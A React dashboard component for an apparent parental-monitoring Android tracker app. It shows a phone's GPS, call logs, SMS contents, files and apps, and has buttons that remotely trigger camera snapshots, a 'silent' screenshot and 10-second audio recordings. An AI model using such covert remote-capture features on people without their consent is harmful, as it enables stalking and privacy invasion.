import React, { useState } from 'react';
import {
  Battery,
  BatteryCharging,
  Navigation,
  HardDrive,
  Activity,
  PhoneCall,
  MessageSquare,
  Image as ImageIcon,
  AppWindow,
  Zap,
  Camera,
  Mic,
  Bell,
  Smartphone,
  RefreshCw,
  Clock,
  ArrowRight,
  Shield,
  CheckCircle2,
  PhoneIncoming,
  PhoneOutgoing,
  PhoneMissed,
  Trash2
} from 'lucide-react';
import {
  triggerTorchToggle,
  triggerCameraSnapshot,
  triggerScreenshot,
  triggerAudioRecording,
  triggerPhoneRing,
  triggerChatOverlay,
  triggerSyncEverything
} from '../services/trackerService';

export default function OverviewDashboard({
  currentDevice,
  locations = [],
  logs = [],
  media = [],
  messages = [],
  files = [],
  callLogs = [],
  smsLogs = [],
  installedAppsData,
  onNavigateTab,
  onRequestDeleteDevice
}) {
  const [isTorchOn, setIsTorchOn] = useState(false);
  const [useFrontCamera, setUseFrontCamera] = useState(false);
  const [actionLoading, setActionLoading] = useState(null);
  const [actionNotice, setActionNotice] = useState(null);

  const deviceId = currentDevice?.deviceId || currentDevice?.id || 'dev_preview_nexus';
  const latestLocation = locations[0] || {};
  const batteryLevel = currentDevice?.batteryLevel ?? latestLocation.batteryLevel ?? 85;
  const isCharging = currentDevice?.isCharging ?? latestLocation.isCharging ?? false;
  const isMonitoring = currentDevice?.monitoringActive ?? true;
  const storageInfo = currentDevice?.storageInfo || {
    totalStorageGB: 128.0,
    usedStorageGB: 46.2,
    freeStorageGB: 81.8,
    storagePercentUsed: 36,
    totalRamGB: 8.0,
    freeRamGB: 3.4
  };

  const apps = installedAppsData?.apps || [];
  const totalAppsCount = installedAppsData?.totalCount ?? apps.length;
  const userAppsCount = installedAppsData?.userAppsCount ?? apps.filter(a => !a.isSystemApp).length;

  const showNotice = (msg, success = true) => {
    setActionNotice({ text: msg, success });
    setTimeout(() => setActionNotice(null), 4000);
  };

  const handleToggleTorch = async () => {
    try {
      setActionLoading('TORCH');
      const next = !isTorchOn;
      await triggerTorchToggle(deviceId, next);
      setIsTorchOn(next);
      showNotice(`Torch turned ${next ? 'ON' : 'OFF'}`);
    } catch (err) {
      showNotice(`Torch failed: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const handleSnapshot = async () => {
    try {
      setActionLoading('SNAP');
      await triggerCameraSnapshot(deviceId, useFrontCamera);
      showNotice(`Snapshot triggered (${useFrontCamera ? 'Front Selfie' : 'Back Camera'})`);
    } catch (err) {
      showNotice(`Snapshot error: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const handleScreenshot = async () => {
    try {
      setActionLoading('SCREENSHOT');
      await triggerScreenshot(deviceId);
      showNotice('Screenshot capture command dispatched to device!');
    } catch (err) {
      showNotice(`Screenshot error: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const handleAudio = async () => {
    try {
      setActionLoading('AUDIO');
      await triggerAudioRecording(deviceId, 10);
      showNotice('10s audio recording command dispatched');
    } catch (err) {
      showNotice(`Audio error: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const handleRing = async () => {
    try {
      setActionLoading('RING');
      await triggerPhoneRing(deviceId);
      showNotice('Emergency siren alarm triggered on device!');
    } catch (err) {
      showNotice(`Siren error: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const handleChatOverlay = async () => {
    try {
      setActionLoading('CHAT');
      await triggerChatOverlay(deviceId);
      showNotice('Chat overlay opened on child phone screen!');
    } catch (err) {
      showNotice(`Chat overlay error: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const handleSyncAll = async () => {
    try {
      setActionLoading('SYNC');
      await triggerSyncEverything(deviceId);
      showNotice('Sync command dispatched for all device data!');
    } catch (err) {
      showNotice(`Sync error: ${err.message}`, false);
    } finally {
      setActionLoading(null);
    }
  };

  const formatTime = (ts) => {
    if (!ts) return 'Live';
    try {
      const date = typeof ts === 'number' ? new Date(ts) : (ts.toDate ? ts.toDate() : new Date(ts));
      return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    } catch (_) {
      return 'Live';
    }
  };

  return (
    <div className="space-y-4 sm:space-y-6">
      {/* Action Notification Banner */}
      {actionNotice && (
        <div className={`p-3 rounded-xl border text-xs flex items-center justify-between shadow-lg transition-all ${
          actionNotice.success
            ? 'bg-emerald-950/70 border-emerald-500/50 text-emerald-300'
            : 'bg-rose-950/70 border-rose-500/50 text-rose-300'
        }`}>
          <span>{actionNotice.text}</span>
          <button onClick={() => setActionNotice(null)} className="text-slate-400 hover:text-white">✕</button>
        </div>
      )}

      {/* Device Info & Management Bar */}
      <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-3.5 sm:p-4 shadow-xl flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
        <div className="flex items-center space-x-3 min-w-0">
          <div className="p-2.5 rounded-xl bg-cyan-950/60 border border-cyan-800/40 text-cyan-400 shrink-0 shadow-md">
            <Smartphone className="w-5 h-5" />
          </div>
          <div className="min-w-0">
            <div className="flex items-center space-x-2 truncate">
              <h3 className="font-bold text-white text-sm sm:text-base truncate">
                {currentDevice?.deviceName || deviceId}
              </h3>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-slate-950 text-cyan-300 border border-cyan-800/40 shrink-0">
                {currentDevice?.model || currentDevice?.manufacturer || 'Android Device'}
              </span>
              <span className={`w-2 h-2 rounded-full shrink-0 ${currentDevice?.isOnline ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
            </div>
            <div className="text-[11px] font-mono text-slate-400 truncate mt-0.5">
              Device ID: <span className="text-cyan-300">{deviceId}</span> • Ping: {formatTime(currentDevice?.lastSeen || latestLocation.timestamp)}
            </div>
          </div>
        </div>

        {onRequestDeleteDevice && currentDevice && (
          <button
            onClick={() => onRequestDeleteDevice(currentDevice)}
            className="flex items-center justify-center space-x-1.5 px-3 py-1.5 sm:py-2 rounded-xl bg-rose-950/40 hover:bg-rose-900/60 border border-rose-800/40 hover:border-rose-700 text-rose-300 hover:text-white text-xs font-semibold transition-all shadow-sm shrink-0 self-end sm:self-auto active:scale-95"
            title="Remove this device from web dashboard"
          >
            <Trash2 className="w-3.5 h-3.5 text-rose-400" />
            <span>Remove Device</span>
          </button>
        )}
      </div>

      {/* 1. Top Telemetry Cards */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-2.5 sm:gap-4">
        {/* Battery */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-3.5 sm:p-4 shadow-lg flex items-center space-x-3">
          <div className={`p-2.5 rounded-xl border shrink-0 ${isCharging ? 'bg-amber-950/40 border-amber-600/40 text-amber-400' : 'bg-cyan-950/40 border-cyan-600/40 text-cyan-400'}`}>
            {isCharging ? <BatteryCharging className="w-5 h-5 animate-pulse" /> : <Battery className="w-5 h-5" />}
          </div>
          <div className="min-w-0">
            <div className="text-[11px] text-slate-400 font-medium">Battery Power</div>
            <div className="text-base sm:text-xl font-black text-white flex items-center space-x-1.5">
              <span>{batteryLevel}%</span>
              {isCharging && <span className="text-[10px] text-amber-400 font-mono">⚡ Charging</span>}
            </div>
            <div className="text-[10px] text-slate-500 truncate">{isCharging ? 'Connected to Power' : 'Discharging'}</div>
          </div>
        </div>

        {/* GPS Fix */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-3.5 sm:p-4 shadow-lg flex items-center space-x-3">
          <div className="p-2.5 rounded-xl bg-cyan-950/40 border border-cyan-600/40 text-cyan-400 shrink-0">
            <Navigation className="w-5 h-5" />
          </div>
          <div className="min-w-0">
            <div className="text-[11px] text-slate-400 font-medium">GPS Coordinates</div>
            <div className="text-xs sm:text-sm font-bold text-white font-mono truncate">
              {latestLocation.latitude ? `${latestLocation.latitude.toFixed(4)}, ${latestLocation.longitude?.toFixed(4)}` : 'Fixing Location...'}
            </div>
            <div className="text-[10px] text-cyan-400 truncate">Accuracy: ±{(latestLocation.accuracy || 5).toFixed(1)}m</div>
          </div>
        </div>

        {/* Storage */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-3.5 sm:p-4 shadow-lg flex items-center space-x-3">
          <div className="p-2.5 rounded-xl bg-purple-950/40 border border-purple-600/40 text-purple-400 shrink-0">
            <HardDrive className="w-5 h-5" />
          </div>
          <div className="min-w-0 flex-1">
            <div className="text-[11px] text-slate-400 font-medium">Device Storage</div>
            <div className="text-xs sm:text-sm font-bold text-white font-mono truncate">
              {storageInfo.usedStorageGB} / {storageInfo.totalStorageGB} GB ({storageInfo.storagePercentUsed}%)
            </div>
            <div className="text-[10px] text-purple-400 truncate">{storageInfo.freeStorageGB} GB Available</div>
          </div>
        </div>

        {/* Service & RAM */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-3.5 sm:p-4 shadow-lg flex items-center space-x-3">
          <div className={`p-2.5 rounded-xl border shrink-0 ${isMonitoring ? 'bg-emerald-950/40 border-emerald-600/40 text-emerald-400' : 'bg-rose-950/40 border-rose-600/40 text-rose-400'}`}>
            <Activity className="w-5 h-5" />
          </div>
          <div className="min-w-0">
            <div className="text-[11px] text-slate-400 font-medium">Tracking Service</div>
            <div className="text-base sm:text-xl font-black text-white flex items-center space-x-1.5">
              <span>{isMonitoring ? 'ACTIVE' : 'IDLE'}</span>
              <span className={`w-2 h-2 rounded-full shrink-0 ${isMonitoring ? 'bg-emerald-400 animate-ping' : 'bg-rose-500'}`}></span>
            </div>
            <div className="text-[10px] text-slate-400 truncate">{storageInfo.freeRamGB} GB RAM free</div>
          </div>
        </div>
      </div>

      {/* 2. Quick Command Actions Bar */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl p-3.5 sm:p-4 shadow-xl">
        <div className="flex items-center justify-between mb-3 pb-2 border-b border-slate-800/80">
          <div className="flex items-center space-x-2">
            <Zap className="w-4 h-4 text-cyan-400" />
            <h3 className="text-xs sm:text-sm font-bold text-white">Quick Remote Triggers</h3>
          </div>
          <span className="text-[11px] text-slate-400">Single-click hardware commands</span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-7 gap-2 sm:gap-2.5">
          {/* Torch Switch */}
          <button
            onClick={handleToggleTorch}
            disabled={actionLoading === 'TORCH'}
            className={`p-2.5 rounded-xl border text-xs font-bold flex flex-col items-center justify-center space-y-1 transition-all ${
              isTorchOn
                ? 'bg-amber-500 text-black border-amber-400 shadow-lg shadow-amber-500/20'
                : 'bg-slate-950/60 hover:bg-slate-950 border-slate-800 text-slate-300'
            }`}
          >
            <Zap className={`w-4 h-4 ${isTorchOn ? 'fill-current animate-pulse' : 'text-amber-400'}`} />
            <span>{isTorchOn ? 'Flashlight ON' : 'Flashlight OFF'}</span>
          </button>

          {/* Quick Screen Screenshot */}
          <button
            onClick={handleScreenshot}
            disabled={actionLoading === 'SCREENSHOT'}
            className="p-2.5 rounded-xl bg-slate-950/60 hover:bg-slate-950 border border-slate-800 text-slate-300 hover:text-emerald-300 font-semibold text-xs flex flex-col items-center justify-center space-y-1 transition-colors"
            title="Silent live screenshot of mobile screen"
          >
            <Smartphone className={`w-4 h-4 text-emerald-400 ${actionLoading === 'SCREENSHOT' ? 'animate-pulse' : ''}`} />
            <span>{actionLoading === 'SCREENSHOT' ? 'Capturing...' : 'Take Screenshot'}</span>
          </button>

          {/* Quick Snapshot */}
          <div className="flex flex-col bg-slate-950/60 border border-slate-800 rounded-xl p-1.5 justify-between">
            <div className="flex items-center justify-between px-1 mb-1">
              <span className="text-[10px] text-slate-400 font-medium">Camera</span>
              <button
                onClick={() => setUseFrontCamera(!useFrontCamera)}
                className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-cyan-300 hover:text-white"
              >
                {useFrontCamera ? 'Front' : 'Back'}
              </button>
            </div>
            <button
              onClick={handleSnapshot}
              disabled={actionLoading === 'SNAP'}
              className="py-1 px-2 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-black font-bold text-[11px] flex items-center justify-center space-x-1"
            >
              <Camera className="w-3 h-3" />
              <span>Snap Photo</span>
            </button>
          </div>

          {/* Quick Audio Note */}
          <button
            onClick={handleAudio}
            disabled={actionLoading === 'AUDIO'}
            className="p-2.5 rounded-xl bg-slate-950/60 hover:bg-slate-950 border border-slate-800 text-slate-300 hover:text-purple-300 font-semibold text-xs flex flex-col items-center justify-center space-y-1 transition-colors"
          >
            <Mic className="w-4 h-4 text-purple-400" />
            <span>Record 10s Audio</span>
          </button>

          {/* Emergency Siren */}
          <button
            onClick={handleRing}
            disabled={actionLoading === 'RING'}
            className="p-2.5 rounded-xl bg-slate-950/60 hover:bg-slate-950 border border-slate-800 text-slate-300 hover:text-amber-300 font-semibold text-xs flex flex-col items-center justify-center space-y-1 transition-colors"
          >
            <Bell className="w-4 h-4 text-amber-400" />
            <span>Ring Alarm Siren</span>
          </button>

          {/* Live Chat Overlay */}
          <button
            onClick={handleChatOverlay}
            disabled={actionLoading === 'CHAT'}
            className="p-2.5 rounded-xl bg-slate-950/60 hover:bg-slate-950 border border-slate-800 text-slate-300 hover:text-cyan-300 font-semibold text-xs flex flex-col items-center justify-center space-y-1 transition-colors"
          >
            <Smartphone className="w-4 h-4 text-cyan-400" />
            <span>Open Chat Overlay</span>
          </button>

          {/* Sync Everything */}
          <button
            onClick={handleSyncAll}
            disabled={actionLoading === 'SYNC'}
            className="p-2.5 rounded-xl bg-cyan-950/40 hover:bg-cyan-900/40 border border-cyan-800/40 text-cyan-300 font-bold text-xs flex flex-col items-center justify-center space-y-1 transition-colors"
          >
            <RefreshCw className={`w-4 h-4 ${actionLoading === 'SYNC' ? 'animate-spin' : ''}`} />
            <span>Sync All Feeds</span>
          </button>
        </div>
      </div>

      {/* 3. Feature Summary Grid (Compact Preview Cards: "sb thoda thoda do") */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6">
        
        {/* GPS Tracker Preview */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <Navigation className="w-4 h-4 text-cyan-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Live GPS Tracker</h4>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">Ping: {formatTime(latestLocation.timestamp)}</span>
            </div>
            
            <div className="bg-slate-950/80 rounded-xl p-3 border border-slate-800 space-y-2 mb-3">
              <div className="flex items-center justify-between text-xs">
                <span className="text-slate-400">Coordinates:</span>
                <span className="font-mono text-cyan-300 font-bold">
                  {latestLocation.latitude ? `${latestLocation.latitude.toFixed(4)}, ${latestLocation.longitude?.toFixed(4)}` : 'Streaming...'}
                </span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-slate-400">Accuracy & Speed:</span>
                <span className="text-slate-200">±{(latestLocation.accuracy || 5).toFixed(1)}m • {(latestLocation.speed || 0).toFixed(1)} km/h</span>
              </div>
              <div className="flex items-center justify-between text-xs">
                <span className="text-slate-400">History Points:</span>
                <span className="text-slate-200 font-mono">{locations.length} breadcrumbs recorded</span>
              </div>
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('MAP')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-cyan-300 hover:text-cyan-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>Open Interactive Map & Geofence</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* Recent Calls Preview */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <PhoneCall className="w-4 h-4 text-emerald-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Recent Calls</h4>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-950/80 text-emerald-300 border border-emerald-800/40">
                {callLogs.length} Total
              </span>
            </div>

            <div className="space-y-1.5 mb-3">
              {callLogs.length === 0 ? (
                <div className="text-xs text-slate-500 italic py-4 text-center">No call logs synced yet</div>
              ) : (
                callLogs.slice(0, 3).map((call, idx) => (
                  <div key={call.id || idx} className="p-2 rounded-xl bg-slate-950/60 border border-slate-800 flex items-center justify-between text-xs">
                    <div className="flex items-center space-x-2 truncate">
                      {call.type === 'INCOMING' && <PhoneIncoming className="w-3.5 h-3.5 text-emerald-400 shrink-0" />}
                      {call.type === 'OUTGOING' && <PhoneOutgoing className="w-3.5 h-3.5 text-cyan-400 shrink-0" />}
                      {call.type === 'MISSED' && <PhoneMissed className="w-3.5 h-3.5 text-rose-400 shrink-0" />}
                      <div className="truncate">
                        <div className="font-semibold text-white truncate max-w-[120px]">{call.name || call.number}</div>
                        <div className="text-[10px] text-slate-500 font-mono">{call.durationFormatted || '0s'}</div>
                      </div>
                    </div>
                    <span className="text-[10px] text-slate-400 shrink-0 ml-1">{formatTime(call.timestamp)}</span>
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('CALLS')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-emerald-300 hover:text-emerald-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>View All Calls & Dialer ({callLogs.length})</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* Recent SMS Preview */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <MessageSquare className="w-4 h-4 text-purple-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Recent SMS Messages</h4>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-purple-950/80 text-purple-300 border border-purple-800/40">
                {smsLogs.length} Total
              </span>
            </div>

            <div className="space-y-1.5 mb-3">
              {smsLogs.length === 0 ? (
                <div className="text-xs text-slate-500 italic py-4 text-center">No SMS messages synced yet</div>
              ) : (
                smsLogs.slice(0, 3).map((sms, idx) => (
                  <div key={sms.id || idx} className="p-2 rounded-xl bg-slate-950/60 border border-slate-800 text-xs">
                    <div className="flex items-center justify-between mb-0.5">
                      <span className="font-semibold text-purple-300 font-mono text-[11px] truncate max-w-[130px]">{sms.address}</span>
                      <span className="text-[10px] text-slate-500">{formatTime(sms.timestamp)}</span>
                    </div>
                    <p className="text-slate-300 text-[11px] truncate">{sms.body}</p>
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('CALLS')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-purple-300 hover:text-purple-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>View All SMS & Sender ({smsLogs.length})</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* Captured Media Preview */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <ImageIcon className="w-4 h-4 text-cyan-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Media Vault</h4>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-cyan-950/80 text-cyan-300 border border-cyan-800/40">
                {media.length} Items
              </span>
            </div>

            <div className="grid grid-cols-3 gap-2 mb-3">
              {media.length === 0 ? (
                <div className="col-span-3 text-xs text-slate-500 italic py-4 text-center">No media captured yet</div>
              ) : (
                media.slice(0, 3).map((item, idx) => (
                  <div key={item.id || idx} className="rounded-xl overflow-hidden border border-slate-800 aspect-square bg-slate-950 relative group">
                    {item.type === 'IMAGE' || item.type === 'SCREENSHOT' ? (
                      <div className="w-full h-full relative">
                        <img src={item.downloadUrl} alt="preview" className="w-full h-full object-cover" />
                        {item.type === 'SCREENSHOT' && (
                          <span className="absolute bottom-1 left-1 bg-black/75 text-emerald-300 text-[8px] font-mono px-1 py-0.5 rounded border border-emerald-800/40">
                            Screen
                          </span>
                        )}
                      </div>
                    ) : (
                      <div className="w-full h-full flex flex-col items-center justify-center p-1 text-center bg-purple-950/40">
                        <Mic className="w-4 h-4 text-purple-400 mb-1" />
                        <span className="text-[9px] text-purple-300 font-mono">{item.durationSeconds || 10}s</span>
                      </div>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('MEDIA')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-cyan-300 hover:text-cyan-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>Browse Full Media Vault ({media.length})</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* Installed Apps Preview */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <AppWindow className="w-4 h-4 text-emerald-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Installed Applications</h4>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-950/80 text-emerald-300 border border-emerald-800/40">
                {totalAppsCount} Apps
              </span>
            </div>

            <div className="space-y-1.5 mb-3">
              {apps.length === 0 ? (
                <div className="text-xs text-slate-500 italic py-4 text-center">No apps inventory synced yet</div>
              ) : (
                apps.slice(0, 3).map((app, idx) => (
                  <div key={app.packageName || idx} className="p-2 rounded-xl bg-slate-950/60 border border-slate-800 flex items-center justify-between text-xs">
                    <div className="flex items-center space-x-2 truncate">
                      <div className="w-6 h-6 rounded-lg bg-cyan-950/60 border border-cyan-800/40 text-cyan-400 font-bold text-[10px] flex items-center justify-center shrink-0">
                        {(app.name || 'A')[0].toUpperCase()}
                      </div>
                      <span className="font-semibold text-white truncate max-w-[120px]">{app.name}</span>
                    </div>
                    <span className={`text-[9px] px-1.5 py-0.5 rounded font-mono ${app.isSystemApp ? 'bg-purple-950 text-purple-300' : 'bg-emerald-950 text-emerald-300'}`}>
                      {app.isSystemApp ? 'SYSTEM' : 'USER'}
                    </span>
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('APPS')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-emerald-300 hover:text-emerald-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>Explore All Apps ({totalAppsCount})</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* Storage & Files Preview */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <HardDrive className="w-4 h-4 text-amber-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Storage Files</h4>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-amber-950/80 text-amber-300 border border-amber-800/40">
                {files.length} Files
              </span>
            </div>

            <div className="space-y-1.5 mb-3">
              {files.length === 0 ? (
                <div className="text-xs text-slate-500 italic py-4 text-center">No files indexed yet</div>
              ) : (
                files.slice(0, 3).map((file, idx) => (
                  <div key={file.id || idx} className="p-2 rounded-xl bg-slate-950/60 border border-slate-800 flex items-center justify-between text-xs">
                    <div className="truncate min-w-0 pr-2">
                      <div className="font-semibold text-white truncate max-w-[150px]">{file.name}</div>
                      <div className="text-[10px] text-slate-500 font-mono truncate">{file.folder || 'Downloads'}</div>
                    </div>
                    <span className="text-[10px] text-amber-300 font-mono shrink-0">{file.sizeFormatted || '1 MB'}</span>
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('FILES')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-amber-300 hover:text-amber-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>Open File Explorer ({files.length})</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

      </div>

      {/* 4. Bottom Activity & Chat Row */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* Family Chat Snippet */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <MessageSquare className="w-4 h-4 text-cyan-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Live Family Chat</h4>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">{messages.length} messages</span>
            </div>

            <div className="space-y-2 max-h-32 overflow-y-auto mb-3 pr-1">
              {messages.length === 0 ? (
                <div className="text-xs text-slate-500 italic py-2 text-center">No chat messages yet</div>
              ) : (
                messages.slice(-3).map((m, idx) => (
                  <div key={m.id || idx} className={`p-2 rounded-xl text-xs ${m.sender === 'PARENT' ? 'bg-cyan-950/40 border border-cyan-800/40 text-cyan-200' : 'bg-slate-800/60 text-slate-200'}`}>
                    <div className="flex items-center justify-between text-[10px] text-slate-400 mb-0.5">
                      <span className="font-bold">{m.sender === 'PARENT' ? 'Guardian' : 'Child'}</span>
                      <span>{formatTime(m.timestamp)}</span>
                    </div>
                    <p className="truncate">{m.text}</p>
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('CHAT')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-cyan-300 hover:text-cyan-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>Open Full Chat Room & Calling</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>

        {/* Recent Audit Logs Snippet */}
        <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-800 mb-3">
              <div className="flex items-center space-x-2">
                <Clock className="w-4 h-4 text-purple-400" />
                <h4 className="text-xs sm:text-sm font-bold text-white">Audit & Event Stream</h4>
              </div>
              <span className="text-[10px] text-slate-400 font-mono">{logs.length} logged</span>
            </div>

            <div className="space-y-1.5 max-h-32 overflow-y-auto mb-3 pr-1">
              {logs.length === 0 ? (
                <div className="text-xs text-slate-500 italic py-2 text-center">No system events logged</div>
              ) : (
                logs.slice(0, 3).map(log => (
                  <div key={log.id} className="p-2 rounded-xl bg-slate-950/60 border border-slate-800 text-xs">
                    <div className="flex items-center justify-between">
                      <span className="font-semibold text-cyan-300 font-mono text-[10px]">{log.eventType}</span>
                      <span className="text-[10px] text-slate-500">{formatTime(log.timestamp)}</span>
                    </div>
                    <p className="text-slate-300 text-[11px] truncate mt-0.5">{log.message}</p>
                  </div>
                ))
              )}
            </div>
          </div>

          <button
            onClick={() => onNavigateTab('CONTROLS')}
            className="w-full py-2 px-3 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-purple-300 hover:text-purple-200 text-xs font-semibold flex items-center justify-center space-x-1.5 transition-colors border border-slate-700/60"
          >
            <span>View Full Control Hub & Audit Logs</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>
    </div>
  );
}
